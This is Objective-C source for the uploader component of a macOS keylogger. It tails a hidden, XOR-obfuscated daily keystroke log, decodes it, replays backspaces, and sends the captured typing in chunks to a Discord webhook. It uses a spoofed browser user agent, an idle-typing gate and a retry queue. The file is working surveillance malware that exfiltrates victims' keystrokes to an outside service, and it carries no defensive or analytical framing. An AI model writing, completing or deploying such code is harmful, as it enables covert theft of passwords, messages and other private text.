// uploader.m — tails today's ENCRYPTED .dat log, ships chunks to Discord webhook
// Matches agent.m/agent.py: XOR(SHA256(user@host)), backspace-aware, HW stamp,
// word-boundary chunks, retry queue, Mozilla UA.
#import <Cocoa/Cocoa.h>
#import <CommonCrypto/CommonDigest.h>
static NSString *gHook; static NSTimeInterval gInt; static NSString *gLabel = nil;
static NSMutableData *gKey = nil;
void df_setLabel(NSString *label){ gLabel=[label copy]; }
static void df_makeUpKey(void) {
    NSString *u = [[[NSProcessInfo processInfo] environment] objectForKey:@"USER"];
    if (!u.length) u = NSUserName();
    char hn[256] = {}; gethostname(hn, sizeof(hn) - 1);
    NSString *seed = [[NSString stringWithFormat:@"%@@%s", u, hn] lowercaseString];
    NSData *d = [seed dataUsingEncoding:NSUTF8StringEncoding];
    unsigned char h[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256(d.bytes, (CC_LONG)d.length, h);
    gKey = [NSMutableData dataWithBytes:h length:sizeof(h)];
}
static NSString* todayPath(void){
    NSDateComponents *c=[[NSCalendar currentCalendar] components:NSCalendarUnitDay|NSCalendarUnitMonth|NSCalendarUnitYear fromDate:[NSDate date]];
    return [[NSHomeDirectory() stringByAppendingPathComponent:@".cache/.sysdata"]
        stringByAppendingPathComponent:[NSString stringWithFormat:@"%04ld-%02ld-%02ld.dat",(long)c.year,(long)c.month,(long)c.day]];
}
static NSString* queuePath(void){ return [todayPath() stringByAppendingString:@".q"]; }
static void qpush(NSString *part){
    NSData *b=[part dataUsingEncoding:NSUTF8StringEncoding]; uint32_t L=(uint32_t)b.length;
    NSFileHandle *h=[NSFileHandle fileHandleForWritingAtPath:queuePath()];
    if(!h){ [[NSData data] writeToFile:queuePath() atomically:YES];
        [[NSFileManager defaultManager] setAttributes:@{NSFilePosixPermissions:@0600} ofItemAtPath:queuePath() error:nil];
        h=[NSFileHandle fileHandleForWritingAtPath:queuePath()]; }
    @try{ [h seekToEndOfFile]; [h writeData:[NSData dataWithBytes:&L length:4]]; [h writeData:b]; [h closeFile]; }
    @catch(NSException *e){}
}
static NSArray* qpopAll(void){
    NSData *d=[NSData dataWithContentsOfFile:queuePath]; if(!d) return @[];
    NSMutableArray *o=[NSMutableArray array]; const uint8_t *b=d.bytes; NSUInteger pos=0;
    while(pos+4<=d.length){ uint32_t L=*(uint32_t*)(b+pos); pos+=4;
        if(pos+L>d.length||L>2000) break;
        NSString *s=[[NSString alloc] initWithData:[NSData dataWithBytes:b+pos length:L] encoding:NSUTF8StringEncoding];
        if(s) [o addObject:s]; pos+=L; }
    return o;
}
static void qdrop(NSUInteger n){
    NSData *d=[NSData dataWithContentsOfFile:queuePath]; if(!d) return;
    const uint8_t *b=d.bytes; NSUInteger pos=0;
    for(NSUInteger i=0;i<n&&pos+4<=d.length;i++){ uint32_t L=*(uint32_t*)(b+pos); pos+=4+L; }
    if(pos<d.length) [[d subdataWithRange:NSMakeRange(pos,d.length-pos)] writeToFile:queuePath() atomically:YES];
    else [[NSFileManager defaultManager] removeItemAtPath:queuePath() error:nil];
}
static BOOL postPart(NSString *part){
    if(!part.length) return YES;
    NSURL *u=[NSURL URLWithString:gHook]; if(!u) return NO;
    NSString *content = gLabel.length ? [NSString stringWithFormat:@"**[%@]**\n```%@```",gLabel,part]
                                      : [NSString stringWithFormat:@"```%@```",part];
    NSDictionary *body=@{@"content":content};
    NSData *d=[NSJSONSerialization dataWithJSONObject:body options:0 error:nil]; if(!d) return YES; // unencodable: drop
    NSMutableURLRequest *r=[NSMutableURLRequest requestWithURL:u];
    r.HTTPMethod=@"POST";
    [r setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    [r setValue:@"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)" forHTTPHeaderField:@"User-Agent"];
    r.HTTPBody=d;
    NSURLResponse *rp=nil;
    [NSURLConnection sendSynchronousRequest:r returningResponse:&rp error:nil];
    NSInteger st=[(NSHTTPURLResponse*)rp statusCode];
    return (st==200||st==204);
}
static void postChunks(NSString *text){
    // backspace-aware (mirrors agent.py: \x08 deletes previous char)
    NSMutableString *cl=[NSMutableString stringWithCapacity:text.length];
    for(NSUInteger i=0;i<text.length;i++){ unichar c=[text characterAtIndex:i];
        if(c=='\x08'){ if(cl.length && [cl characterAtIndex:cl.length-1]!='\n') [cl deleteCharactersInRange:NSMakeRange(cl.length-1,1)]; }
        else [cl appendFormat:@"%C",c]; }
    NSString *s=[cl stringByReplacingOccurrencesOfString:@"`" withString:@"'"];
    // word/newline-boundary chunks at 1800
    NSUInteger pos=0;
    while(pos<s.length){
        NSString *rest=[s substringFromIndex:pos];
        if(![rest stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]].length) break;
        NSUInteger end=(s.length-pos<=1800)?s.length:pos+1800;
        if(end<s.length){
            NSRange win=NSMakeRange(pos,end-pos);
            NSRange nl=[s rangeOfString:@"\n" options:NSBackwardsSearch range:win];
            NSRange sp=[s rangeOfString:@" " options:NSBackwardsSearch range:win];
            NSUInteger cut=end;
            if(nl.location!=NSNotFound && nl.location>pos+200) cut=nl.location;
            else if(sp.location!=NSNotFound && sp.location>pos+200) cut=sp.location;
            end=cut;
        }
        NSString *part=[s substringWithRange:NSMakeRange(pos,end-pos)]; pos=end;
        while(pos<s.length && [s characterAtIndex:pos]==' ') pos++;
        if(![part stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]].length) continue;
        if(!postPart(part)) qpush(part);
        [NSThread sleepForTimeInterval:0.5];
    }
}
void df_startUploader(NSString *webhook, NSTimeInterval interval){
    gHook=[webhook copy]; gInt=interval>=5?interval:8;
    df_makeUpKey();
    dispatch_async(dispatch_get_global_queue(0,0),^{
        unsigned long long off=0;
        NSString *p=todayPath();
        if([[NSFileManager defaultManager] fileExistsAtPath:p])
            off=[[[NSFileManager defaultManager] attributesOfItemAtPath:p error:nil] fileSize];
        NSTimeInterval lastFlush=[[NSDate date] timeIntervalSince1970];
        for(;;){
            [NSThread sleepForTimeInterval:2];
            // drain retry queue first
            NSArray *q=qpopAll(); NSUInteger ok=0;
            for(NSString *qp in q){ if(postPart(qp)) ok++; else break; [NSThread sleepForTimeInterval:0.5]; }
            if(ok) qdrop(ok);
            if(ok<q.count) continue; // still offline
            NSString *np=todayPath();
            if(![np isEqualToString:p]){p=np;off=0;} // new day file
            NSData *d=[NSData dataWithContentsOfFile:p];
            if(!d||d.length<=off) continue;
            // idle gate: wait for pause in typing (file mtime), force every 180s
            NSTimeInterval idle=8;
            NSDictionary *at=[[NSFileManager defaultManager] attributesOfItemAtPath:p error:nil];
            if(at) idle=[[NSDate date] timeIntervalSinceDate:[at fileModificationDate]];
            BOOL forced=([[NSDate date] timeIntervalSince1970]-lastFlush)>=180;
            if(idle<8 && !forced) continue;
            // min-length gate: skip tiny fragments (offset untouched)
            if(!forced && d.length-off<12) continue;
            lastFlush=[[NSDate date] timeIntervalSince1970];
            NSData *slice=[d subdataWithRange:NSMakeRange((NSUInteger)off,d.length-off)];
            off=d.length;
            // decrypt at absolute offset
            NSMutableData *m=[slice mutableCopy]; uint8_t *b=m.mutableBytes; const uint8_t *k=gKey.bytes;
            for(NSUInteger i=0;i<m.length;i++) b[i]^=k[(off-m.length+i)%gKey.length];
            NSString *s=[[NSString alloc] initWithData:m encoding:NSUTF8StringEncoding];
            if(s.length) postChunks(s);
        }
    });
}
